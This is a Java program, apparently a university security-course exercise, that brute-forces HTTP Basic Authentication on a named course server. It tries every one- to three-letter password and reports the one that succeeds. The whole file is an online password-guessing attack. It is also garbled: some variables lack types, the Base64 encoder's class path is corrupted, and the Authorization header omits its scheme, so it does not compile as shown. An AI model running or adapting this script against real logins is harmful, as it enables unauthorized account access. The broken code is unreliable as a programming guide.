




import java.io.IOException;
import java.net.*;

import java.io.*;
import java.util.*;



public class BruteForce

{

   static String strLetter[];

   static URL url = null;
   static URLConnection urlConnection;
   static InputStream urlStream;

   static String strExceptionPassword[];

   static int intExceptionCount = -1;

   static int intNumberOfConnectionAttempts = 0;

   static String username = "";

   static String strLastPasswordTested;



   public static void main (String args[])
   
   {

         
         
      Calendar calStart;
      Calendar calFinish;   
      Date dateStart;
      Date dateFinish;
       lngStart;
       lngFinish;



         
         
      calStart  = new GregorianCalendar();
      dateStart = calStart.getTime();
      lngStart  = dateStart.getTime();          




      System.out.println();
      System.out.println();




         
         
      populateArray();


         
         
         
         

      boolean boolPasswordFound = false;
      boolean boolExceptionPasswordsTestedAgain = false;

      String strPasswd;




      String urlString
            = "http://sec-crack.cs.rmit.edu./SEC/2/index.php";

      int intCounter1 = 0;
      int intCounter2 = 0;
      int intCounter3 = 0;

      int intArrayLength = strLetter.length;




         
         
         
         
         
      strExceptionPassword = new String[5000];



      if (!boolPasswordFound) 
      {


            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 < intArrayLength) )
         {

            boolPasswordFound = true;

            boolPasswordFound 
                   = passwordWasFound(urlString,
                                      strLetter[intCounter1], 
                                      boolPasswordFound);

            intCounter1++;

         }



            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 < intArrayLength) )
         {

            intCounter2 = 0;

            while ( (!boolPasswordFound) && (intCounter2 < intArrayLength) )
            {

               boolPasswordFound = true;

               boolPasswordFound 
                   = passwordWasFound
                          (urlString,
                           strLetter[intCounter1] 
                                  + strLetter[intCounter2], 
                           boolPasswordFound);

               intCounter2++;  

            }


            intCounter1++;

         }




            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 < intArrayLength) )
         {

            intCounter2 = 0;

            while ( (!boolPasswordFound) && (intCounter2 < intArrayLength) )
            {

               intCounter3 = 0;


               while ( (!boolPasswordFound) && (intCounter3 < intArrayLength) )
               {

                  boolPasswordFound = true;


                  boolPasswordFound 
                      = passwordWasFound
                             (urlString,
                              strLetter[intCounter1] 
                                    + strLetter[intCounter2]
                                    + strLetter[intCounter3], 
                              boolPasswordFound);

                  intCounter3++;

               }


               intCounter2++;

            }


            intCounter1++; 

         }




            
            
            
            
            

         intCounter1 = 0;

         while ( (!boolPasswordFound) && (intCounter1 <= intExceptionCount) )
         {

            boolExceptionPasswordsTestedAgain = true;
            boolPasswordFound = true;

            boolPasswordFound 
                = passwordWasFound(urlString,
                                   strExceptionPassword[intCounter1],
                                   boolPasswordFound);  

            intCounter1++;

         }

      }   



      System.out.println();



         
         
      calFinish  = new GregorianCalendar();
      dateFinish = calFinish.getTime();
      lngFinish  = dateFinish.getTime();      



         
         
      System.out.println();
      System.out.println();


      System.out.println();
      System.out.println("Length of time for processing: " + 
                         ((lngFinish - lngStart) / 1000)   + 
                         " seconds");


      System.out.println();
      System.out.println("Number of connection attempts = " + intNumberOfConnectionAttempts);


      System.out.println();
      System.out.println("Number of exceptions thrown = " + (intExceptionCount + 1));


      if (intExceptionCount >= 0)
      {
         System.out.print("These EXCEPTION passwords WERE ");

         if (boolExceptionPasswordsTestedAgain)
            System.out.print("tested again.");
         else
            System.out.print("NOT tested again.");

         System.out.println();
      }


      System.out.println();


      if (boolPasswordFound) 
      {
         System.out.println("The correct password WAS found - this password is '" + 
                            strLastPasswordTested + "'.");
      } 
      else
      {
         System.out.println("The correct password WAS NOT found.");
      } 
            
      System.out.println();




   }







   static void populateArray()
   
   {

      strLetter = new String[52];


      strLetter[0]  = "a";
      strLetter[1]  = "b";
      strLetter[2]  = "c";
      strLetter[3]  = "d";
      strLetter[4]  = "e";
      strLetter[5]  = "f";
      strLetter[6]  = "g";
      strLetter[7]  = "h";
      strLetter[8]  = "i";
      strLetter[9]  = "j";
      strLetter[10] = "k";
      strLetter[11] = "l";
      strLetter[12] = "m";
      strLetter[13] = "n";
      strLetter[14] = "o";
      strLetter[15] = "p";
      strLetter[16] = "q";
      strLetter[17] = "r";
      strLetter[18] = "s";
      strLetter[19] = "t";
      strLetter[20] = "u";
      strLetter[21] = "v";
      strLetter[22] = "w";
      strLetter[23] = "x";
      strLetter[24] = "y";
      strLetter[25] = "z";
      strLetter[26] = "A";
      strLetter[27] = "B";
      strLetter[28] = "C";
      strLetter[29] = "D";
      strLetter[30] = "E";
      strLetter[31] = "F";
      strLetter[32] = "G";
      strLetter[33] = "H";
      strLetter[34] = "I";
      strLetter[35] = "J";
      strLetter[36] = "K";
      strLetter[37] = "L";
      strLetter[38] = "M";
      strLetter[39] = "N";
      strLetter[40] = "O";
      strLetter[41] = "P";
      strLetter[42] = "Q";
      strLetter[43] = "R";
      strLetter[44] = "S";
      strLetter[45] = "T";
      strLetter[46] = "U";
      strLetter[47] = "V";
      strLetter[48] = "W";
      strLetter[49] = "X";
      strLetter[50] = "Y";
      strLetter[51] = "Z";

   }







   static boolean passwordWasFound(String urlString,
                                   String password,
                                   boolean retVal)
   
   {

      String strEncodeInput = username + ":" + password;
      boolean returnValue = retVal;
      boolean boolExceptionThrown = false;



      try
      {

         strLastPasswordTested = password;
 
         intNumberOfConnectionAttempts++;

         url = new URL(urlString);

         String encoding = new url.misc.BASE64Encoder().encode (strEncodeInput.getBytes());


         System.out.print("username = " + 
                          username      + 
                          "    "        +
                          "password = " +
                          password);



         HttpURLConnection urlConnection = (HttpURLConnection)url.openConnection();

         urlConnection.setRequestProperty("Authorization", 
                                          " " + encoding);   

         System.out.println("    response  = " + urlConnection.getResponseCode());

         if (urlConnection.getResponseCode() == 401)
         {
            returnValue = false;         
         }

      }

      catch (MalformedURLException m)
      {
         boolExceptionThrown = true;
         returnValue = false;

         System.err.println(m);
         System.out.println("Malformed URL Exception error");
      }

      catch (IOException io)
      {
         boolExceptionThrown = true;
         returnValue = false;

         System.out.println("IOException error");
         System.err.println(io); 
      }

      catch (Exception e)
      {
         boolExceptionThrown = true;
         returnValue = false;

         System.out.println("General exception.....");
         System.err.println(e); 
      }

      finally
      { 
         urlConnection = null;
         url = null; 
      }


      if (boolExceptionThrown)
      {
         intExceptionCount++;
         strExceptionPassword[intExceptionCount] = password;
      }


      return returnValue;

   }

}